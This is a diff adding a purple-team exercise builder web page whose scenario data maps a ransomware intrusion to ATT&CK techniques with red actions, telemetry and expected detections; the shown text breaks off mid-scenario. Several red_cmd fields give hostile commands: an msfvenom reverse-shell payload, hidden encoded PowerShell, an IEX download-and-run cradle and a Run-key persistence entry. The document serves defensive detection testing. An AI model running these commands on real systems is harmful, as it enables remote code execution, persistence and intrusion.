@@ -1,0 +1,1418 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Purple Team Exercise Builder — Dan Howett / Useful</title>
+<meta name="description" content="Build a structured purple team exercise from a chosen scenario. For each ATT&CK technique: red action, expected telemetry, expected detection, and live findings — produces a runbook for the day and a backlog of detection gaps.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#f5f7f9;
+  --bg-elev:#ffffff;
+  --bg-soft:#eef2f5;
+  --text:#1a2230;
+  --text-muted:#525a68;
+  --text-dim:#8a909a;
+  --border:#dee3e9;
+  --border-strong:#c5ccd4;
+  --red:#8a4a5a;
+  --red-soft:#f0e4e8;
+  --blue:#3f5b7a;
+  --blue-soft:#e8edf3;
+  --purple:#6e5a7a;
+  --purple-soft:#ede8f0;
+  --accent:var(--purple);
+  --accent-hover:#5a4866;
+  --accent-soft:var(--purple-soft);
+  --shadow-sm:0 1px 2px rgba(30,40,60,0.04);
+  --shadow-md:0 4px 14px -6px rgba(30,40,60,0.10), 0 1px 2px rgba(30,40,60,0.04);
+  --st-planned:#9aa1ab;
+  --st-planned-soft:#eef2f5;
+  --st-executed:#5a7a8a;
+  --st-executed-soft:#e8eef2;
+  --st-blocked:#5d8a6e;
+  --st-blocked-soft:#e8f0eb;
+  --st-failed:#a16a47;
+  --st-failed-soft:#f4ead8;
+  --st-notdetected:#a16868;
+  --st-notdetected-soft:#f3e6e6;
+  --st-logged:#a18647;
+  --st-logged-soft:#f3eada;
+  --st-alerted:#5a8579;
+  --st-alerted-soft:#e8f0ee;
+}
+[data-theme="dark"]{
+  --bg:#0d1117;
+  --bg-elev:#161b22;
+  --bg-soft:#1c232c;
+  --text:#e6edf3;
+  --text-muted:#9ba6b3;
+  --text-dim:#6a7280;
+  --border:#262e38;
+  --border-strong:#3a4350;
+  --red:#bb8898;
+  --red-soft:rgba(187,136,152,0.12);
+  --blue:#8aa6cb;
+  --blue-soft:rgba(138,166,203,0.12);
+  --purple:#a594b3;
+  --purple-soft:rgba(165,148,179,0.12);
+  --accent:var(--purple);
+  --accent-hover:#b8a8c4;
+  --accent-soft:rgba(165,148,179,0.18);
+  --shadow-sm:none;
+  --shadow-md:0 4px 14px -6px rgba(0,0,0,0.4);
+  --st-planned:#6a7280;
+  --st-planned-soft:rgba(106,114,128,0.14);
+  --st-executed:#8aa6c0;
+  --st-executed-soft:rgba(138,166,192,0.12);
+  --st-blocked:#7eb098;
+  --st-blocked-soft:rgba(126,176,152,0.12);
+  --st-failed:#cd9a72;
+  --st-failed-soft:rgba(205,154,114,0.12);
+  --st-notdetected:#cd8d8d;
+  --st-notdetected-soft:rgba(205,141,141,0.12);
+  --st-logged:#cdb472;
+  --st-logged-soft:rgba(205,180,114,0.12);
+  --st-alerted:#86b0a5;
+  --st-alerted-soft:rgba(134,176,165,0.12);
+}
+
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.55;-webkit-font-smoothing:antialiased;transition:background .25s,color .25s}
+.mono{font-family:'JetBrains Mono',monospace}
+a{color:inherit;text-decoration:none}
+button{font-family:inherit;cursor:pointer}
+
+/* ===== SITE HEADER ===== */
+.site{position:sticky;top:0;z-index:50;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+.site-inner{max-width:1280px;margin:0 auto;padding:12px 24px;display:flex;align-items:center;gap:16px}
+.brand{display:flex;align-items:center;gap:10px;color:var(--text);font-weight:700;font-size:.92rem}
+.brand .logo{width:30px;height:30px;border-radius:7px;background:var(--accent);color:#fff;display:grid;place-items:center;font-weight:800;font-size:.78rem;letter-spacing:-.02em}
+.brand .slash{color:var(--text-dim);font-weight:400}
+.brand .second{color:var(--text-muted);font-weight:500}
+.site-meta{margin-left:auto;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+
+.btn{font-family:'JetBrains Mono',monospace;font-size:.72rem;font-weight:500;letter-spacing:.02em;border:1px solid var(--border-strong);background:var(--bg-elev);color:var(--text-muted);padding:7px 12px;border-radius:7px;cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
+.btn:hover{color:var(--text);border-color:var(--accent);background:var(--accent-soft)}
+.btn.sm{padding:5px 9px;font-size:.66rem}
+.btn.danger:hover{color:#a16868;border-color:#a16868;background:#f3e6e6}
+[data-theme="dark"] .btn.danger:hover{color:#cd8d8d;background:rgba(205,141,141,0.12);border-color:#cd8d8d}
+.btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+.btn.primary:hover{background:var(--accent-hover);border-color:var(--accent-hover);color:#fff}
+.btn.subtle{background:transparent;border-color:transparent;color:var(--text-dim)}
+.btn.subtle:hover{background:var(--bg-soft);color:var(--text)}
+.theme-toggle{width:34px;height:34px;padding:0;justify-content:center}
+
+/* ===== LAYOUT ===== */
+.wrap{max-width:1280px;margin:0 auto;padding:0 24px}
+.hero{padding:40px 0 24px}
+.eyebrow{font-family:'JetBrains Mono',monospace;font-size:.72rem;letter-spacing:.08em;text-transform:uppercase;color:var(--accent);margin-bottom:14px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.eyebrow .dot{color:var(--text-dim)}
+h1.title{font-family:'Inter',sans-serif;font-weight:800;font-size:clamp(2rem,4.5vw,3rem);line-height:1.08;letter-spacing:-.02em;margin-bottom:16px;max-width:22ch}
+.lede{font-size:1.02rem;color:var(--text-muted);max-width:62ch}
+.lede strong{color:var(--text);font-weight:600}
+.stat-row{display:flex;gap:24px;flex-wrap:wrap;margin-top:24px;padding-top:20px;border-top:1px solid var(--border)}
+.stat{display:flex;flex-direction:column;gap:2px}
+.stat .n{font-family:'Inter',sans-serif;font-weight:700;font-size:1.6rem;line-height:1;letter-spacing:-.02em;color:var(--text)}
+.stat .l{font-family:'JetBrains Mono',monospace;font-size:.64rem;letter-spacing:.06em;text-transform:uppercase;color:var(--text-dim)}
+
+/* ===== SECTION ===== */
+.section{padding:28px 0;border-top:1px solid var(--border)}
+.section-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px}
+.section-head .idx{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--accent);letter-spacing:.06em}
+.section-head h2{font-family:'Inter',sans-serif;font-weight:700;font-size:1.4rem;letter-spacing:-.02em}
+.section-head .sub{font-size:.86rem;color:var(--text-dim);margin-left:auto}
+.card{background:var(--bg-elev);border:1px solid var(--border);border-radius:12px;box-shadow:var(--shadow-sm)}
+
+/* ===== SETUP ===== */
+.setup-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px;padding:18px}
+.setup-row{display:flex;flex-direction:column;gap:6px}
+.setup-row label{font:500 .68rem/1 'JetBrains Mono',monospace;letter-spacing:.06em;text-transform:uppercase;color:var(--text-dim)}
+.setup-row input, .setup-row select, .setup-row textarea{font:500 .88rem/1.3 'Inter',sans-serif;color:var(--text);background:var(--bg);border:1px solid var(--border-strong);border-radius:7px;padding:9px 11px;outline:none;transition:border-color .15s,box-shadow .15s;font-family:'Inter',sans-serif}
+.setup-row input:focus, .setup-row select:focus, .setup-row textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.setup-row textarea{resize:vertical;min-height:60px}
+
+/* ===== SCENARIO PICKER ===== */
+.scn-picker{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:10px;padding:0 18px 18px}
+.scn-chip{font:500 .82rem/1.3 'Inter',sans-serif;border:1px solid var(--border-strong);background:var(--bg);color:var(--text-muted);padding:14px 16px;border-radius:8px;cursor:pointer;transition:all .15s;display:flex;flex-direction:column;align-items:flex-start;gap:6px;text-align:left}
+.scn-chip:hover{border-color:var(--accent);color:var(--text)}
+.scn-chip.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.scn-chip .scn-name{font-weight:700;font-size:.94rem}
+.scn-chip .scn-tagline{font-size:.78rem;opacity:.85;line-height:1.4}
+.scn-chip .scn-meta{font:500 .64rem/1 'JetBrains Mono',monospace;opacity:.75;letter-spacing:.04em;text-transform:uppercase;margin-top:4px}
+
+/* ===== DASHBOARD ===== */
+.dash{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:14px;margin-bottom:24px}
+.dash-card{background:var(--bg-elev);border:1px solid var(--border);border-radius:12px;padding:18px;box-shadow:var(--shadow-sm)}
+.dash-card h3{font:600 .68rem/1 'JetBrains Mono',monospace;letter-spacing:.08em;text-transform:uppercase;color:var(--text-dim);margin-bottom:14px}
+.bigstat{display:flex;align-items:baseline;gap:10px;margin-bottom:12px}
+.bigstat .n{font:800 2.2rem/1 'Inter',sans-serif;letter-spacing:-.025em;color:var(--text)}
+.bigstat .of{font:500 .9rem/1 'Inter',sans-serif;color:var(--text-dim)}
+.bigstat .pct{font:600 .78rem/1 'JetBrains Mono',monospace;color:var(--st-alerted);background:var(--st-alerted-soft);padding:4px 8px;border-radius:5px;margin-left:auto}
+.progressbar{height:8px;background:var(--bg-soft);border-radius:4px;overflow:hidden;display:flex}
+.pb-seg{height:100%;transition:width .3s}
+.pb-alerted{background:var(--st-alerted)}
+.pb-logged{background:var(--st-logged)}
+.pb-notdetected{background:var(--st-notdetected)}
+.pb-blocked{background:var(--st-blocked)}
+.dash-legend{display:flex;gap:14px;margin-top:10px;flex-wrap:wrap;font:500 .68rem/1 'JetBrains Mono',monospace;color:var(--text-dim);letter-spacing:.04em}
+.dash-legend .sw{display:inline-block;width:9px;height:9px;border-radius:2px;margin-right:4px;vertical-align:middle}
+.dash-legend .sw.alerted{background:var(--st-alerted)}
+.dash-legend .sw.logged{background:var(--st-logged)}
+.dash-legend .sw.notdetected{background:var(--st-notdetected)}
+.dash-legend .sw.blocked{background:var(--st-blocked)}
+.alert{display:flex;align-items:center;gap:8px;padding:9px 11px;background:var(--bg-soft);border-radius:7px;margin-bottom:6px;font-size:.82rem;color:var(--text-muted)}
+.alert .num{font:700 .9rem/1 'Inter',sans-serif;color:var(--text);min-width:24px;text-align:center}
+.alert.warn{background:var(--st-notdetected-soft);color:var(--st-notdetected)}
+.alert.warn .num{color:var(--st-notdetected)}
+.alert .lbl{flex:1}
+.alert.empty{color:var(--text-dim);background:transparent;padding:6px 0;font-style:italic}
+
+/* ===== FILTER BAR ===== */
+.filterbar{display:flex;gap:14px;flex-wrap:wrap;padding:14px 18px;background:var(--bg-elev);border:1px solid var(--border);border-radius:10px;margin-bottom:18px;align-items:center}
+.filter-group{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.filter-label{font:500 .68rem/1 'JetBrains Mono',monospace;letter-spacing:.06em;text-transform:uppercase;color:var(--text-dim);margin-right:4px}
+.filter-chip{font:500 .76rem/1 'Inter',sans-serif;color:var(--text-muted);background:transparent;border:1px solid var(--border-strong);padding:6px 11px;border-radius:999px;cursor:pointer;transition:all .15s}
+.filter-chip:hover{color:var(--text);border-color:var(--accent)}
+.filter-chip.active{color:#fff;background:var(--accent);border-color:var(--accent)}
+.search-wrap{position:relative;margin-left:auto;flex:0 0 240px}
+.search-input{width:100%;height:34px;padding:0 12px 0 32px;font:500 .82rem/1 'Inter',sans-serif;color:var(--text);background:var(--bg);border:1px solid var(--border-strong);border-radius:6px;outline:none}
+.search-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.search-input::placeholder{color:var(--text-dim)}
+.search-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text-dim);font-size:.9rem;pointer-events:none}
+
+/* ===== PHASE GROUP ===== */
+.phase-group{margin-bottom:32px}
+.phase-head{display:flex;align-items:baseline;gap:14px;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid var(--border)}
+.phase-head .id{font:700 .72rem/1 'JetBrains Mono',monospace;color:var(--accent);letter-spacing:.06em;padding:5px 9px;background:var(--accent-soft);border-radius:5px}
+.phase-head h3{font:700 1.15rem/1.1 'Inter',sans-serif;letter-spacing:-.015em}
+.phase-head .meta{font:500 .72rem/1 'JetBrains Mono',monospace;color:var(--text-dim);margin-left:auto;letter-spacing:.04em}
+.phase-head .meta .pct{color:var(--text)}
+.tech-list{display:flex;flex-direction:column;gap:10px}
+
+/* ===== TECHNIQUE ROW ===== */
+.tech{background:var(--bg-elev);border:1px solid var(--border);border-radius:10px;overflow:hidden;transition:border-color .15s}
+.tech:hover{border-color:var(--border-strong)}
+.tech-head{display:grid;grid-template-columns:auto 1fr auto auto auto;gap:12px;padding:14px 16px;align-items:center;cursor:pointer;user-select:none}
+.tech-head:hover{background:var(--bg-soft)}
+.tech.open .tech-head{background:var(--bg-soft);border-bottom:1px solid var(--border)}
+.tech-id{font:600 .72rem/1 'JetBrains Mono',monospace;color:var(--accent);letter-spacing:.02em;min-width:68px;background:var(--accent-soft);padding:5px 8px;border-radius:5px;text-align:center}
+.tech-title{font:600 .94rem/1.3 'Inter',sans-serif;color:var(--text);letter-spacing:-.005em}
+.tech-status{display:flex;align-items:center;gap:5px;font:600 .64rem/1 'JetBrains Mono',monospace;letter-spacing:.06em;text-transform:uppercase;padding:5px 8px;border-radius:5px;white-space:nowrap}
+.tech-status .dotsym{width:7px;height:7px;border-radius:50%;background:currentColor}
+.red-status{}
+.red-status.planned{color:var(--st-planned);background:var(--st-planned-soft)}
+.red-status.executed{color:var(--st-executed);background:var(--st-executed-soft)}
+.red-status.blocked{color:var(--st-blocked);background:var(--st-blocked-soft)}
+.red-status.failed{color:var(--st-failed);background:var(--st-failed-soft)}
+.blue-status{}
+.blue-status.notdetected{color:var(--st-notdetected);background:var(--st-notdetected-soft)}
+.blue-status.logged{color:var(--st-logged);background:var(--st-logged-soft)}
+.blue-status.alerted{color:var(--st-alerted);background:var(--st-alerted-soft)}
+.blue-status.blocked{color:var(--st-blocked);background:var(--st-blocked-soft)}
+.blue-status.unset{color:var(--st-planned);background:var(--st-planned-soft)}
+.tech-chev{color:var(--text-dim);font-size:.8rem;transition:transform .2s}
+.tech.open .tech-chev{transform:rotate(180deg)}
+
+.tech-body{padding:16px;display:none;gap:18px;flex-direction:column}
+.tech.open .tech-body{display:flex}
+
+.tech-info{background:var(--bg-soft);border-radius:7px;padding:13px 15px;font-size:.86rem;color:var(--text-muted);line-height:1.5}
+.tech-info strong{color:var(--text);font-weight:600;display:block;font-size:.66rem;font-family:'JetBrains Mono',monospace;letter-spacing:.08em;text-transform:uppercase;color:var(--text-dim);margin-bottom:6px}
+.tech-info .red-hdr{color:var(--red)}
+.tech-info .blue-hdr{color:var(--blue)}
+.tech-info pre{background:var(--bg);border:1px solid var(--border);border-radius:5px;padding:8px 10px;font:500 .76rem/1.5 'JetBrains Mono',monospace;color:var(--text);overflow-x:auto;margin:6px 0 8px;white-space:pre-wrap;word-break:break-word}
+.tech-info ul{margin:6px 0 0 18px;padding:0}
+.tech-info li{margin-bottom:2px}
+
+.split{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.split.full{grid-template-columns:1fr}
+.tech-info.red-side{border-left:3px solid var(--red)}
+.tech-info.blue-side{border-left:3px solid var(--blue)}
+
+.tech-form{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.field{display:flex;flex-direction:column;gap:6px}
+.field.full{grid-column:1/-1}
+.field label{font:500 .66rem/1 'JetBrains Mono',monospace;letter-spacing:.08em;text-transform:uppercase;color:var(--text-dim);display:flex;gap:8px;align-items:center}
+.field label .hint{text-transform:none;letter-spacing:0;font-weight:400;color:var(--text-dim);font-size:.7rem}
+.field label .red-tag{color:var(--red)}
+.field label .blue-tag{color:var(--blue)}
+.field textarea,.field input,.field select{font:500 .84rem/1.45 'Inter',sans-serif;color:var(--text);background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:8px 10px;outline:none;width:100%;resize:vertical;font-family:'Inter',sans-serif}
+.field textarea:focus,.field input:focus,.field select:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.field textarea{min-height:60px}
+
+.action-list{display:flex;flex-direction:column;gap:6px}
+.action-row{display:grid;grid-template-columns:1fr auto;gap:8px;align-items:center}
+.action-row input{font:500 .82rem/1.3 'Inter',sans-serif;color:var(--text);background:var(--bg);border:1px solid var(--border);border-radius:5px;padding:7px 10px;outline:none}
+.action-row input:focus{border-color:var(--accent)}
+.act-del{background:transparent;border:none;color:var(--text-dim);font-size:1rem;cursor:pointer;padding:4px 8px;border-radius:4px;transition:all .15s}
+.act-del:hover{color:var(--st-notdetected);background:var(--st-notdetected-soft)}
+.act-add{align-self:flex-start;margin-top:4px}
+
+/* ===== EMPTY STATE ===== */
+.empty-state{padding:60px 24px;text-align:center;color:var(--text-dim);display:none}
+.empty-state.show{display:block}
+.empty-state .big{font:700 1.4rem/1.1 'Inter',sans-serif;color:var(--text-muted);margin-bottom:8px;letter-spacing:-.02em}
+
+/* ===== FOOTER ===== */
+footer.site-foot{padding:32px 24px;border-top:1px solid var(--border);margin-top:48px}
+.foot-inner{max-width:1280px;margin:0 auto;display:flex;gap:14px;flex-wrap:wrap;align-items:center;font:500 .74rem/1.4 'JetBrains Mono',monospace;color:var(--text-dim);letter-spacing:.02em}
+.foot-inner a{color:var(--text-muted)}
+.foot-inner a:hover{color:var(--text)}
+.foot-inner .sep{color:var(--border-strong)}
+
+/* ===== TOAST ===== */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--text);color:var(--bg);padding:11px 18px;border-radius:8px;font:500 .82rem/1 'Inter',sans-serif;opacity:0;transition:all .25s;pointer-events:none;z-index:100;box-shadow:var(--shadow-md)}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+/* ===== MODAL ===== */
+.modal-bg{position:fixed;inset:0;background:rgba(20,28,40,0.5);display:none;align-items:center;justify-content:center;z-index:200;padding:24px}
+.modal-bg.show{display:flex}
+.modal{background:var(--bg-elev);border:1px solid var(--border);border-radius:12px;max-width:880px;width:100%;max-height:85vh;overflow-y:auto;box-shadow:var(--shadow-md)}
+.modal-head{display:flex;align-items:center;justify-content:space-between;padding:18px 22px;border-bottom:1px solid var(--border)}
+.modal-head h3{font:700 1.05rem/1 'Inter',sans-serif;letter-spacing:-.015em}
+.modal-body{padding:20px 22px;font-size:.86rem;color:var(--text-muted);line-height:1.6}
+.modal-body pre{background:var(--bg-soft);padding:14px;border-radius:8px;font:500 .76rem/1.5 'JetBrains Mono',monospace;color:var(--text);overflow-x:auto;white-space:pre-wrap;word-break:break-word;border:1px solid var(--border);max-height:55vh;overflow-y:auto}
+.modal-foot{display:flex;gap:8px;padding:14px 22px;border-top:1px solid var(--border);justify-content:flex-end}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width:900px){
+  .dash{grid-template-columns:1fr}
+  .tech-head{grid-template-columns:auto 1fr auto;gap:10px}
+  .tech-chev,.blue-status{display:none}
+  .split,.tech-form{grid-template-columns:1fr}
+}
+@media (max-width:600px){
+  .wrap{padding:0 16px}
+  .site-inner{padding:10px 16px;gap:10px;flex-wrap:wrap}
+  .btn{padding:6px 9px;font-size:.66rem}
+  .btn .lbl{display:none}
+  .hero{padding:24px 0 18px}
+  h1.title{font-size:1.7rem}
+}
+
+@media print{
+  .site,.site-meta,.filterbar,.act-add,.act-del,footer.site-foot,.dash-card .btn{display:none !important}
+  body{background:white;color:black}
+  .tech-body{display:flex !important}
+  .tech-chev{display:none}
+  .card,.tech,.dash-card{box-shadow:none;border:1px solid #ccc;page-break-inside:avoid}
+  .phase-group{page-break-inside:avoid}
+}
+</style>
+</head>
+<body>
+
+<!-- SITE HEADER -->
+<header class="site">
+  <div class="site-inner">
+    <a href="index.html" class="brand">
+      <div class="logo">DH</div>
+      <span>Dan Howett<span class="slash">/</span><span class="second">Useful</span></span>
+    </a>
+    <div class="site-meta">
+      <button class="btn sm" onclick="saveState()" title="Download current exercise as JSON"><span>↓</span><span class="lbl">SAVE</span></button>
+      <button class="btn sm" onclick="loadStatePrompt()" title="Load saved exercise"><span>↑</span><span class="lbl">LOAD</span></button>
+      <button class="btn sm" onclick="exportMarkdown()" title="Generate exercise runbook + debrief"><span>📋</span><span class="lbl">EXPORT</span></button>
+      <button class="btn sm" onclick="window.print()" title="Print or save as PDF"><span>⎙</span><span class="lbl">PRINT</span></button>
+      <button class="btn sm danger" onclick="resetState()" title="Clear exercise"><span>⌫</span><span class="lbl">RESET</span></button>
+      <button class="btn sm theme-toggle" onclick="toggleTheme()" title="Cycle theme">◐</button>
+    </div>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="wrap">
+  <section class="hero">
+    <div class="eyebrow">
+      <span>Investigate</span><span class="dot">·</span><span>Purple Team Workflow</span><span class="dot">·</span><span>v1.0</span>
+    </div>
+    <h1 class="title">Purple Team Exercise Builder</h1>
+    <p class="lede">
+      Build a structured purple team exercise from a chosen scenario. For each ATT&amp;CK technique you'll capture the
+      <strong>red action</strong>, <strong>expected telemetry</strong>, <strong>expected detection</strong>, and live findings —
+      then export a clean runbook for the day and a backlog of detection gaps for the blue team to fix.
+      Windows-first guidance, ATT&amp;CK-aligned, client-side only.
+    </p>
+    <div class="stat-row">
+      <div class="stat"><span class="n" id="stat-techniques">—</span><span class="l">Techniques</span></div>
+      <div class="stat"><span class="n" id="stat-alerted">—</span><span class="l">Alerted</span></div>
+      <div class="stat"><span class="n" id="stat-logged">—</span><span class="l">Logged Not Alerted</span></div>
+      <div class="stat"><span class="n" id="stat-notdetected">—</span><span class="l">Not Detected</span></div>
+      <div class="stat"><span class="n" id="stat-backlog">—</span><span class="l">Backlog Items</span></div>
+    </div>
+  </section>
+
+  <!-- SETUP -->
+  <section class="section">
+    <div class="section-head">
+      <span class="idx">01</span>
+      <h2>Setup</h2>
+      <span class="sub">Engagement details</span>
+    </div>
+    <div class="card">
+      <div class="setup-grid">
+        <div class="setup-row">
+          <label for="ex-name">Exercise name</label>
+          <input type="text" id="ex-name" placeholder="e.g. PT-2026-Q2 Ransomware drill" oninput="onSetupChange()">
+        </div>
+        <div class="setup-row">
+          <label for="ex-date">Exercise date</label>
+          <input type="date" id="ex-date" oninput="onSetupChange()">
+        </div>
+        <div class="setup-row">
+          <label for="red-lead">Red lead</label>
+          <input type="text" id="red-lead" placeholder="Name / team" oninput="onSetupChange()">
+        </div>
+        <div class="setup-row">
+          <label for="blue-lead">Blue lead</label>
+          <input type="text" id="blue-lead" placeholder="Name / team" oninput="onSetupChange()">
+        </div>
+        <div class="setup-row" style="grid-column:1/-1">
+          <label for="scope">Scope &amp; rules of engagement</label>
+          <textarea id="scope" placeholder="In-scope environments, out-of-scope systems, kill switches, working hours, escalation contacts…" oninput="onSetupChange()"></textarea>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SCENARIO -->
+  <section class="section">
+    <div class="section-head">
+      <span class="idx">02</span>
+      <h2>Scenario</h2>
+      <span class="sub">Pick the attack pattern you're testing against</span>
+    </div>
+    <div class="card">
+      <div class="scn-picker" id="scnPicker"></div>
+    </div>
+  </section>
+
+  <!-- DASHBOARD -->
+  <section class="section">
+    <div class="section-head">
+      <span class="idx">03</span>
+      <h2>Detection coverage</h2>
+      <span class="sub" id="dash-scname">—</span>
+    </div>
+    <div class="dash">
+      <div class="dash-card">
+        <h3>Outcomes</h3>
+        <div class="bigstat">
+          <span class="n" id="dash-alerted">0</span>
+          <span class="of">of <span id="dash-total">0</span> techniques alerted</span>
+          <span class="pct" id="dash-pct">0%</span>
+        </div>
+        <div class="progressbar" id="dash-pb"></div>
+        <div class="dash-legend">
+          <span><span class="sw alerted"></span>Alerted</span>
+          <span><span class="sw blocked"></span>Blocked</span>
+          <span><span class="sw logged"></span>Logged only</span>
+          <span><span class="sw notdetected"></span>Not detected</span>
+        </div>
+      </div>
+      <div class="dash-card">
+        <h3>Gaps surfaced</h3>
+        <div id="dash-gaps">
+          <div class="alert empty">Run techniques to see gaps surface.</div>
+        </div>
+      </div>
+      <div class="dash-card">
+        <h3>By phase</h3>
+        <div id="dash-phases" style="display:flex;flex-direction:column;gap:8px">
+          <div class="alert empty">Pick a scenario above.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- TECHNIQUES -->
+  <section class="section">
+    <div class="section-head">
+      <span class="idx">04</span>
+      <h2>Techniques</h2>
+      <span class="sub">Walk the kill chain, capture findings as you go</span>
+    </div>
+    <div class="filterbar">
+      <div class="filter-group">
+        <span class="filter-label">Blue</span>
+        <button class="filter-chip active" data-filter="blue" data-value="all" onclick="setFilter('blue','all')">All</button>
+        <button class="filter-chip" data-filter="blue" data-value="alerted" onclick="setFilter('blue','alerted')">Alerted</button>
+        <button class="filter-chip" data-filter="blue" data-value="blocked" onclick="setFilter('blue','blocked')">Blocked</button>
+        <button class="filter-chip" data-filter="blue" data-value="logged" onclick="setFilter('blue','logged')">Logged only</button>
+        <button class="filter-chip" data-filter="blue" data-value="notdetected" onclick="setFilter('blue','notdetected')">Not detected</button>
+      </div>
+      <div class="filter-group">
+        <span class="filter-label">Has gap</span>
+        <button class="filter-chip" data-filter="gap" data-value="hasgap" onclick="setFilter('gap','hasgap')">Detection gaps</button>
+      </div>
+      <div class="search-wrap">
+        <span class="search-icon">⌕</span>
+        <input type="search" id="techSearch" class="search-input" placeholder="Search techniques…" oninput="onSearch()">
+      </div>
+    </div>
+    <div id="techContainer"></div>
+    <div class="empty-state" id="emptyState">
+      <div class="big">No techniques match those filters.</div>
+      <div>Clear the filter or pick a different scenario.</div>
+    </div>
+  </section>
+</div>
+
+<footer class="site-foot">
+  <div class="foot-inner">
+    <a href="index.html">danhowett.github.io/useful</a>
+    <span class="sep">·</span>
+    <span>Client-side only — your exercise data stays in your browser</span>
+    <span class="sep">·</span>
+    <span>v1.0</span>
+  </div>
+</footer>
+
+<div class="toast" id="toast"></div>
+
+<div class="modal-bg" id="exportModal">
+  <div class="modal">
+    <div class="modal-head">
+      <h3>Exercise runbook &amp; debrief</h3>
+      <button class="btn sm subtle" onclick="closeModal()">CLOSE</button>
+    </div>
+    <div class="modal-body">
+      <p style="margin-bottom:12px">Combined runbook for the exercise day and debrief writeup. Markdown — paste into your wiki, ticket system or doc tool.</p>
+      <pre id="exportContent"></pre>
+    </div>
+    <div class="modal-foot">
+      <button class="btn primary" onclick="copyExport()">COPY</button>
+      <button class="btn" onclick="downloadExport()">DOWNLOAD .MD</button>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ================================================================
+   SCENARIOS — each one has phases (kill chain stages) with techniques
+   ================================================================ */
+const SCENARIOS = {};
+</script>
+<script>
+Object.assign(SCENARIOS, {
+
+  /* ============================================================
+     1. COMMODITY RANSOMWARE
+     ============================================================ */
+  ransomware: {
+    id:'ransomware',
+    name:'Commodity ransomware operator',
+    tagline:'Phishing → loader → AD recon → lateral SMB → exfil → encrypt. The modern norm.',
+    profile:'A financially-motivated affiliate operating a known ransomware-as-a-service offering. Operates business hours in their TZ. Will exfil before encryption (double extortion).',
+    phases:[
+      { id:'IA', name:'Initial Access', techniques:[
+        { id:'T1566.001', name:'Spearphishing Attachment',
+          red:'Send a phishing email to a mid-tier finance user with a maldoc (xls/.docm). Macro downloads a loader from attacker-controlled domain.',
+          red_cmd:'# Example payload generation (offline lab)\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=...\n# Email delivery via your purple team mail relay',
+          telemetry:'Email gateway logs · O365 message trace · proxy/firewall egress · EDR process create',
+          detection:'Mail security flags macro doc · attachment quarantined OR macro detonation alert · sandbox verdict' },
+        { id:'T1204.002', name:'User Execution: Malicious File',
+          red:'Test user opens attachment and enables macros. Observe loader process spawn.',
+          red_cmd:'# user action only',
+          telemetry:'EDR process tree (winword.exe → cmd.exe → powershell.exe is classic)',
+          detection:'EDR parent-child anomaly rule for Office app spawning shell/script interpreter' },
+      ]},
+      { id:'EX', name:'Execution & Persistence', techniques:[
+        { id:'T1059.001', name:'PowerShell',
+          red:'Loader runs an obfuscated PowerShell stage to download next-stage implant.',
+          red_cmd:'powershell -nop -w hidden -enc <base64>\n# OR\npowershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://...\')"',
+          telemetry:'PowerShell script block logging (EventID 4104) · AMSI · proxy URL log · EDR command line',
+          detection:'Encoded PowerShell command-line rule · AMSI suspicious content alert · network egress to new domain' },
+        { id:'T1547.001', name:'Boot/Logon Autostart: Registry Run Keys',
+          red:'Implant writes a Run key for user persistence.',
+          red_cmd:'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Users\\victim\\AppData\\Roaming\\loader.exe"',
+          telemetry:'Sysmon EventID 13 (registry value set) · EDR registry monitoring',
+          detection:'Run key modification rule (Sigma: registry_set_run_key)' },
+      ]},
+      { id:'PE', name:'Privilege Escalation', techniques:[
+        { id:'T1068', name:'Exploitation for Privilege Escalation',
+          red:'Use a known local privesc CVE against the endpoint (e.g. PrintNightmare, CVE patches available).',
+          red_cmd:'# Use a controlled, signed PoC in lab\n# e.g. SeManageVolumePrivilege abuse, GodPotato',
+          telemetry:'EDR · WEF process telemetry · Windows event logs',
+          detection:'EDR exploit prevention rule · suspicious process integrity escalation alert' },
+        { id:'T1003.001', name:'OS Credential Dumping: LSASS Memory',
+          red:'Dump LSASS to obtain cached credentials.',
